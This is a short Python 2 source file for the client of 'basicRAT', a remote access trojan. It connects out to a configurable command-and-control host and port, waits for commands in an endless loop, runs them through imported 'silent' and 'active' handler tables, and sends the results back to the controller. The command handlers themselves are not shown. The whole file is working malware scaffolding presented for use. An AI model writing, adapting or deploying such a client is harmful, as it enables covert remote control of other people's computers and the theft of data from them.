#!/usr/bin/env python
# coding: utf-8
import socket

from extras import common
from commands import silent, active

# change these to suit your needs
c2host = 'localhost'
c2port = 1337
duport = 1338 # for download/upload
#################################
##        Main Function        ##
#################################
def main():
    
    # connect to basicRAT server
    conn = socket.socket()
    conn.connect((c2host, c2port))

    while True:
        results = ''

        # wait to receive data from server
        # SHORTFALL: maximum command size is 4096
        # REMEDY: Increase if needed. 4096 should be enough.
        data = conn.recv(4096)
        
        if not data: continue

        # seperate data into command and action
        # all commands are lowercase.
        data = data.rstrip()
        cmd, _, action = data.partition(' ')
        cmd = cmd.lower()
        
        try:
            if cmd in silent:
                print "silent - {}".format(cmd)
                com = silent[cmd]
                com(action)
            
            elif cmd in active:
                print "action - {}".format(cmd)
                com = active[cmd]
                results = com(action)
                # send results here
                conn.send(results)
                
            else:
                print "an invalid command was received - [ {}(\"{}\") ]\n".format(cmd, action)
        
        except Exception as e:
            print e
            raise

if __name__ == '__main__':
    main()
